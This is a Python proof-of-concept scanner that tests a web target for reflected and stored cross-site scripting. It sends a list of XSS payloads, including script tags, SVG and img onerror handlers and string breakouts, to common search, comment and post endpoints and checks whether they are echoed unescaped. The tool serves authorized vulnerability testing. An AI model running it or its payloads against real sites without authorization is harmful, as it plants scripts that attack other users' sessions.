#!/usr/bin/env python3
"""
PoC: Cross-Site Scripting (XSS) — Stored and Reflected

Vulnerability: User-supplied input is rendered unescaped in an HTML response.
This PoC validates AUTO-TRIGGERING XSS only:
  - Reflected: payload executes when a malicious URL is navigated to (no user interaction beyond navigation)
  - Stored: payload executes on page load for all users who view the page

Self-XSS (where an attacker can only inject into their own session) is excluded per
filtering rules — this PoC only confirms cross-user execution vectors.

Validation strategy:
  - Reflected: inject payload in GET params, check if it appears unescaped in response body
  - Stored: POST payload to persistent field, then GET the page and verify raw script appears
  - Confirm: response contains the raw payload string (not HTML-escaped <, >, ")

Usage (authorized testing only, inside Docker):
    python poc_xss_001.py --target http://localhost:3000 --timeout 30

Exit codes:
    0 - CONFIRMED: XSS payload reflected/stored unescaped
    1 - NOT_REPRODUCED: Payload not reflected or properly escaped
    2 - ERROR: Script error or target unreachable

IMPORTANT: Only use against systems you have explicit written authorization to test.
"""

import argparse
import secrets
import sys

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("[ERROR] XSS-001: 'requests' library is required.")
    sys.exit(2)

VULN_ID = "XSS-001"


# ── Payloads ──────────────────────────────────────────────────────────────────

def build_payloads(marker: str) -> list[str]:
    """Return XSS payloads embedding a unique marker for precise confirmation."""
    return [
        # Canonical script tag
        f'<script>alert("{marker}")</script>',
        # Event handler (input context bypass)
        f'" onmouseover="alert(\'{marker}\')" x="',
        f"' onerror='alert(\"{marker}\")' x='",
        # SVG-based (works when HTML tags are filtered but SVG is not)
        f'<svg onload=alert("{marker}")>',
        f'<svg><script>alert("{marker}")</script></svg>',
        # Image onerror
        f'<img src=x onerror=alert("{marker}")>',
        # Template-literal bypass (useful in partial template contexts)
        f'`); alert("{marker}"); (',
        # Angle-bracket-free variant (works in JS string contexts)
        f'";alert("{marker}");//',
        # HTML entity bypass test (confirm raw < vs &lt;)
        f'<b onmouseover=alert("{marker}")>XSS</b>',
    ]


# Endpoints that commonly persist or reflect user input
REFLECTED_PATHS = [
    "/search",
    "/api/search",
    "/",
    "/index",
    "/results",
    "/error",
    "/api/users",
]
REFLECTED_PARAMS = ["q", "query", "search", "name", "input", "message", "text", "s"]

STORED_PATHS = [
    "/api/comments",
    "/api/posts",
    "/api/messages",
    "/api/reviews",
    "/comments",
    "/posts",
    "/contact",
    "/feedback",
]
STORED_FIELDS = ["comment", "body", "message", "content", "text", "name", "title", "description"]

# Pages to check after storing payload
READ_BACK_PATHS = [
    "/",
    "/comments",
    "/posts",
    "/feed",
    "/index",
    "/home",
    "/api/comments",
    "/api/posts",
]


def payload_in_response(payload: str, response_text: str) -> bool:
    """Check that the raw payload appears unescaped (not as &lt;script&gt;)."""
    raw_present = payload in response_text
    # Ensure it's not escaped
    escaped = payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
    escaped_present = escaped in response_text
    return raw_present and not escaped_present


def check_reflected(
    session: requests.Session,
    target: str,
    payloads: list[str],
    marker: str,
) -> dict | None:
    """Test for reflected XSS — payload echoed unescaped in immediate response."""
    for payload in payloads:
        for path in REFLECTED_PATHS:
            for param in REFLECTED_PARAMS:
                url = f"{target}{path}"
                try:
                    resp = session.get(
                        url,
                        params={param: payload},
                        timeout=5,
                        allow_redirects=True,
                    )
                    if resp.status_code == 200 and payload_in_response(payload, resp.text):
                        return {
                            "type": "reflected",
                            "url": url,
                            "param": param,
                            "payload": payload,
                            "response_snippet": resp.text[
                                max(0, resp.text.find(marker) - 60):
                                resp.text.find(marker) + len(payload) + 60
                            ],
                        }
                except RequestException:
                    pass
    return None


def check_stored(
    session: requests.Session,
    target: str,
    payloads: list[str],
    marker: str,
) -> dict | None:
    """Test for stored XSS — payload persisted then reflected on subsequent page load."""
    for payload in payloads[:4]:  # Limit stored attempts
        for store_path in STORED_PATHS:
            for field in STORED_FIELDS[:3]:
                try:
                    # Store the payload
                    session.post(
                        f"{target}{store_path}",
                        json={field: payload, "author": "test", "title": "test"},
                        timeout=5,
                        allow_redirects=False,
                    )
                    session.post(
                        f"{target}{store_path}",
                        data={field: payload},
                        timeout=5,
                        allow_redirects=False,
                    )
                except RequestException:
                    pass

        # Check read-back pages for the unescaped payload
        for read_path in READ_BACK_PATHS:
            try:
                resp = session.get(
                    f"{target}{read_path}",
                    timeout=5,
                    allow_redirects=True,
                )
                if resp.status_code == 200 and payload_in_response(payload, resp.text):
                    return {
                        "type": "stored",
                        "store_attempts": STORED_PATHS,
                        "found_at": f"{target}{read_path}",
                        "payload": payload,
                        "response_snippet": resp.text[
                            max(0, resp.text.find(marker) - 60):
                            resp.text.find(marker) + len(payload) + 60
                        ],
                    }
            except RequestException:
                pass
    return None


def run_exploit(target: str, timeout: int) -> tuple[int, dict]:
    marker = secrets.token_hex(6)
    payloads = build_payloads(marker)

    print(f"[*] {VULN_ID}: XSS PoC (Reflected + Stored)")
    print(f"[*] {VULN_ID}: Target: {target}")
    print(f"[*] {VULN_ID}: Marker: {marker}")
    print(f"[*] {VULN_ID}: {len(payloads)} payload variants")

    session = requests.Session()

    try:
        probe = session.get(target, timeout=10)
        print(f"[*] {VULN_ID}: Target reachable (HTTP {probe.status_code})")
    except RequestException as e:
        print(f"[ERROR] {VULN_ID}: Target unreachable: {e}")
        return 2, {}

    print(f"[*] {VULN_ID}: Phase 1 — reflected XSS...")
    evidence = check_reflected(session, target, payloads, marker)
    if evidence:
        print(f"[CONFIRMED] {VULN_ID}: Reflected XSS confirmed!")
        print(f"[CONFIRMED] {VULN_ID}: URL: {evidence['url']}?{evidence['param']}=...")
        print(f"[CONFIRMED] {VULN_ID}: Payload unescaped in response")
        return 0, evidence

    print(f"[*] {VULN_ID}: Phase 2 — stored XSS...")
    evidence = check_stored(session, target, payloads, marker)
    if evidence:
        print(f"[CONFIRMED] {VULN_ID}: Stored XSS confirmed!")
        print(f"[CONFIRMED] {VULN_ID}: Payload persisted and unescaped at: {evidence['found_at']}")
        return 0, evidence

    print(f"[-] {VULN_ID}: No XSS evidence found (payloads may be escaped or CSP blocks execution)")
    print(f"[*] {VULN_ID}: Verify manually: check response for {marker} without HTML encoding")
    return 1, {"marker": marker}


def main() -> None:
    parser = argparse.ArgumentParser(
        description=f"PoC for XSS ({VULN_ID}) — auto-triggering reflected and stored variants",
        epilog="For authorized security testing only.",
    )
    parser.add_argument("--target", default="http://localhost:3000")
    parser.add_argument("--timeout", type=int, default=30)
    args = parser.parse_args()

    target = args.target.rstrip("/")
    if not target.startswith(("http://", "https://")):
        print(f"[ERROR] {VULN_ID}: Target must start with http:// or https://")
        sys.exit(2)

    try:
        exit_code, results = run_exploit(target, args.timeout)
    except KeyboardInterrupt:
        print(f"\n[!] {VULN_ID}: Interrupted")
        sys.exit(2)
    except Exception as e:
        print(f"[ERROR] {VULN_ID}: Unhandled exception: {e}")
        sys.exit(2)

    if exit_code == 0:
        print(f"[CONFIRMED] {VULN_ID}: XSS confirmed (CVSS 6.1 reflected / 8.2 stored)")
    elif exit_code == 1:
        print(f"[NOT_REPRODUCED] {VULN_ID}: XSS not reproduced")
    sys.exit(exit_code)


if __name__ == "__main__":
    main()
